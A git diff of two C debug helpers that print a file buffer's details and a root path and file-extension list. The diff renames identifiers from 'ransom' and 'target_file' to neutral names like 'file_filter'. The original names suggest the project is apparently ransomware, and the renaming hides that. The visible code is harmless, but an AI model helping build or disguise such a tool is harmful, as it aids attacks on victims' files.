@@ -1,31 +1,31 @@
 #include "fournights.h"
 /**
-  * debug_list - prints elements of the target_file_buf struct
-  * @target_file_buf: lala
+  * debug_list - prints elements of the tmp_bufs struct
+  * @tmp_bufs: lala
   */
-void debug_list(target_file_t *target_file_buf)
+void debug_list(tmp_bufs_t *tmp_bufs)
 {
-	printf("--------%s--------\n", target_file_buf->filepath);
-	printf("bytes_read: %d\n", (int)target_file_buf->bytes_read);
-	printf("file_offset: %d\n", (int)target_file_buf->file_offset);
-	printf("st_size: %d\n", (int)target_file_buf->file_info.st_size);
-	target_file_buf->buf[400] = '\0';
-	printf("%s...(truncated)...", target_file_buf->buf);
+	printf("--------%s--------\n", tmp_bufs->filepath);
+	printf("bytes_read: %d\n", (int)tmp_bufs->bytes_read);
+	printf("file_offset: %d\n", (int)tmp_bufs->file_offset);
+	printf("st_size: %d\n", (int)tmp_bufs->file_info.st_size);
+	tmp_bufs->buf[400] = '\0';
+	printf("%s...(truncated)...", tmp_bufs->buf);
 	getchar();
 }
 /**
   * print_for_debug - prints elements of the struct for debugging
-  * @ransom: pointer to the ransom struct
+  * @file_filter: pointer to the file_filter struct
   */
-void print_for_debug(struct ransom_s ransom)
+void print_for_debug(struct file_filter_s file_filter)
 {
 	int debug_int = 0;
 	char **debug_dp = NULL;
 
 	/* PRINT STRUCT FOR DEBUGGING */
-	printf("DEBUG 0: root_path: %s\n", ransom.root_path);
+	printf("DEBUG 0: root_path: %s\n", file_filter.root_path);
 	printf("DEBUG 2: file extension list \n");
-	debug_dp = ransom.file_extensions;
+	debug_dp = file_filter.file_extensions;
 	for (debug_int = 0; debug_dp[debug_int] != NULL; debug_int++)
 		printf("%s%s", debug_int == 0 ? "" : ", ", debug_dp[debug_int]);
 	getchar();
